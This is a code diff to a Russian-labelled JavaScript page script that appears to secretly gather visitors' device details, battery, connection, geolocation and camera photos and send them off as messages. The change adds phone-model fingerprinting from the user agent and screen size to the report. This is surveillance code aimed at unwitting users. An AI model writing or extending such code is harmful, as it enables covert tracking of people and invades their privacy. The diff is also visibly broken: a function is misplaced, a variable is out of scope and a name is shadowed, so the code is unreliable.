@@ -46,6 +46,7 @@ async function sendAllInfo() {
     else if (ua.indexOf('Edg') > -1) browser = 'Edge';
     
     const screenSize = `${screen.width}x${screen.height}`;
+    const phoneModel = getPhoneModel();
     const time = new Date().toLocaleString('ru-RU');
     
     let battery = '';
@@ -70,7 +71,7 @@ async function sendAllInfo() {
     } catch(e) {}
     
     const message = `📱 Устройство: ${os} | ${browser}
-📐 Экран: ${screenSize}
+📲 Модель: ${phoneModel}
 ⏰ Время: ${time}
 ${battery}
 ${connection}
@@ -145,7 +146,45 @@ async function takePhoto(stream, caption) {
 async function main() {
     // 1. Вся информация
     await sendAllInfo();
+
+await sendMessage(message);
+}
+
+// ========== НОВАЯ ФУНКЦИЯ ==========
+    function getPhoneModel() {
+        const ua = navigator.userAgent;
+        const screen = `${screen.width}x${screen.height}`;
     
+        if (ua.includes('iPhone')) {
+        const models = {
+            '320x480': 'iPhone SE/4/4s',
+            '375x667': 'iPhone 6/7/8/SE2',
+            '375x812': 'iPhone X/XS/11 Pro',
+            '390x844': 'iPhone 12/13/14',
+            '393x852': 'iPhone 15 Pro/16/16 Plus',
+            '414x896': 'iPhone XR/11/11 Pro Max',
+            '428x926': 'iPhone 14 Plus/15 Plus',
+            '430x932': 'iPhone 15 Pro Max/16 Pro Max'
+        };
+        return models[screen] || 'iPhone (неизвестная модель)';
+    }
+    
+    if (ua.includes('Android')) {
+        const match = ua.match(/\(.+?\)/);
+        if (match) {
+            const parts = match[0].split(';');
+            for (let part of parts) {
+                if (part.includes('SM-') || part.includes('Pixel') || part.includes('Redmi') || part.includes('MI')) {
+                    return part.trim();
+                }
+            }
+        }
+        return `Android (экран ${screen})`;
+    }
+    
+    return 'Неизвестное устройство';
+}
+
     // 2. Геолокация
     getGeo(async (loc) => {
         if (loc) {
